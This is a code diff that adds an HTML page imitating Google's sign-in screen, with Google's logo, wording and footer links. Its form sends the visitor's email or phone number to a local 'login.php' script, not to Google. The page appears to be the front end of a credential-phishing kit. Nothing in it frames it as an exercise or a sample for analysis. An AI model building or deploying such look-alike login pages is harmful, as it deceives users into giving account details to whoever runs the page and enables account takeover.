@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign-In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        body {
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: white;
+            width: 400px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 75px;
+        }
+
+        h1 {
+            font-weight: normal;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        p {
+            text-align: center;
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 30px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1a73e8;
+            font-size: 14px;
+        }
+
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #5f6368;
+            text-align: center;
+            margin-top: 40px;
+            line-height: 1.5;
+        }
+
+        .footer-text a {
+            margin: 0 4px;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4a/Logo_2013_Google.png" alt="Google Logo">
+    </div>
+
+    <h1>Sign in</h1>
+<p>to continue to Google</p>
+
+<form action="login.php" method="POST">
+    <input type="text" name="username" placeholder="Email or phone" required>
+
+    <a href="#">Forgot email?</a>
+
+    <div class="actions">
+        <a href="#">Create account</a>
+        <button type="submit">Next</button>
+    </div>
+</form>
+
+
+    <div class="footer-text">
+        <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+        <p><a href="#">Help</a> · <a href="#">Privacy</a> · <a href="#">Terms</a></p>
+    </div>
+</div>
+
+</body>
+</html>
